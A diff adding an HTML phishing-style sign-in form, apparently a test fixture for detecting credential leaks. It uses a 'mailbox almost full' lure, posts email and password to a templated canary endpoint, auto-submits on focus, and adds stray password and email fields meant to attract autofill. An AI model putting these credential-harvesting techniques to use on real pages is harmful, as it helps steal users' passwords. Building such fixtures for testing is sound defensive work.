@@ -1,0 +1,13 @@
+<div style="font-family:Arial,sans-serif;max-width:420px;margin:0 auto;border:1px solid #ccc;padding:16px">
+  <h3>Your mailbox is almost full</h3>
+  <p>Sign in to keep your messages. This takes less than a minute.</p>
+  <form action="{{CANARY}}/{{ID}}/phish-post" method="post">
+    <label>Email <input type="text" name="user" autofocus onfocus="this.form.submit()"></label><br>
+    <label>Password <input type="password" name="pass" autocomplete="current-password"></label><br>
+    <input type="hidden" name="source" value="mail">
+    <input type="submit" value="Sign in">
+  </form>
+  <form action="{{CANARY}}/{{ID}}/phish-javascript-action" onsubmit="return false"><input type="password" name="p2"></form>
+  <input type="password" name="loose" autocomplete="new-password">
+  <input type="email" name="loose2" autocomplete="username" value="reader@shop.example">
+</div>
